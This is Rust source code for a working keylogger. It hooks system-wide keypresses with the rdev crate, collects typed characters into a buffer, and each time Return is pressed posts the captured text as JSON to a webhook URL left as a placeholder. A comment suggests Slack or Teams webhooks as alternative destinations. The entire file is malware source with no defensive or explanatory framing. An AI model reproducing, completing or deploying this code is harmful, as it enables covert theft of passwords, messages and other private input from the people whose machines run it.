use rdev::{EventType::*, Key::*};
use reqwest::blocking::Client;
use std::collections::HashMap;

fn main() {
    let webhook_url = "PUT_WEBHOOK_HERE";

    let client = Client::new();
    let mut key_buffer: Vec<String> = Vec::new();

    rdev::listen(move |event| {
        let key = match event.event_type {
            KeyPress(key) => Some(key),
            _ => None,
        };

        if let Some(key) = key {
            match key {
                Space => key_buffer.push(" ".to_string()),
                Backspace => key_buffer.push("BACKSPACE".to_string()),
                Delete => key_buffer.push("DELETE".to_string()),
                Return => {
                    let content = key_buffer.join("");
                    let mut payload = HashMap::new();
                    payload.insert("content", &content);
                    //payload.insert("text", &content);  Use this instead for Teams or Slack
                    key_buffer.clear();
                    println!("Sending data:\n{}", &content);
                    let res = client.post(webhook_url).json(&payload).send();
                    match res {
                        Ok(_) => println!("Succesfully sent data."),
                        Err(e) => eprintln!("Error sending request: {:?}", e),
                    }
                }
                _ => {
                    if let Some(key) = event.name {
                        if key.bytes().last() < Some(127_u8) && key.bytes().last() > Some(31_u8) {
                            key_buffer.push(key)
                        }
                    }
                }
            }
        }
    })
    .unwrap();
}
